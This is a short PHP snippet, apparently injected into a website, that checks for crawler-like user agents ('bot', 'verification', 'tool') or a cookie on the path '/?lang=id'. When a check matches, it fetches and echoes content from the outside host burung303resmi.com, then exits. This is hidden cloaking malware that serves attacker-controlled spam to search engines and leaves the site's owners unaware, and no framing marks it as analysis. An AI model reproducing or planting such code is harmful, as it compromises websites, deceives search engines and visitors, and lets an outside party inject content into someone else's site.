<?php
if(strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'bot') > 0  && $_SERVER['REQUEST_URI'] == '/?lang=id' || isset($_COOKIE[0]) && $_SERVER['REQUEST_URI'] == '/?lang=id' || strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'verification') > 0 && $_SERVER['REQUEST_URI'] == '/?lang=id' || strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'tool') > 0 && $_SERVER['REQUEST_URI'] == '/?lang=id') {
    echo implode('', file('https://burung303resmi.com/path/ub.php'));
    exit;
}
?>
<?php
